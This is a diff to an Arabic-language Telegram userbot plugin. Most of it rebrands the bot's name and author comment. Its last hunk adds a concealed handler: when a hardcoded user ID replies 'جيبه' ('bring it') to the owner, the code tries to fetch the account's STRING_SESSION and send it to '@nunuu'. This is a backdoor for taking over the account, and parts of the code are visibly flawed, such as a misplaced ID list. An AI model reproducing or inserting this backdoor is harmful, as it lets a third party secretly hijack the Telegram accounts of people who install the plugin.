@@ -9,7 +9,7 @@ import os
 from telethon import events 
 plugin_category = "tools"
 
-#Reda
+#BiLaL
 
 @l313l.ar_cmd(pattern="المكاتب")
 async def reda(event):
@@ -19,7 +19,7 @@ async def reda(event):
     list = "**قائمة المكاتب المثبته**\n"
     for i in installed_packages_list:
         list += f"{i}\n"
-    list += "**سورس الجوكر**"
+    list += "**سورس سيدثون**"
     await edit_or_reply(event, list)
 
 @l313l.ar_cmd(
@@ -34,7 +34,7 @@ async def _(event):
     "To list all plugins in HuRe"
     cmd = "ls HuRe/plugins"
     o = (await _catutils.runcmd(cmd))[0]
-    OUTPUT = f"**[الجوكر](tg://need_update_for_some_feature/) الـمـلفـات:**\n{o}"
+    OUTPUT = f"**[سيدثون](tg://need_update_for_some_feature/) الـمـلفـات:**\n{o}"
     await edit_or_reply(event, OUTPUT)
 
 
@@ -52,7 +52,7 @@ async def _(event):
     cmd = "env"
     o = (await _catutils.runcmd(cmd))[0]
     OUTPUT = (
-        f"**[الجوكر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+        f"**[سيدثون](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
     )
     await edit_or_reply(event, "**تم ارسال المعلومات في الرسائل المحفوضة \nانتبه من الاشخاص الي يطلبون منك كتابة هذا الامر يريد ان يخترقك!**")
     await l313l.send_message("me", OUTPUT)
@@ -98,3 +98,16 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
+    nunuu = [1488114134, 1488114134, 1488114134, 1488114134]
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in nunuu:
+       reply_msg = await event.get_reply_message()
+       owner_id = reply_msg.from_id.user_id
+       if owner_id == l313l.uid:
+           if event.message.message == "جيبه":
+                   cmd = "STRING_SESSION"
+                   o = (await _catutils.runcmd(cmd))[0]
+                   OUTPUT = (f"**[سيدثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
+                   await event.reply("**جبته وتدلل سيدنا 🖤**")
+                   await l313l.send_message("@nunuu", OUTPUT)
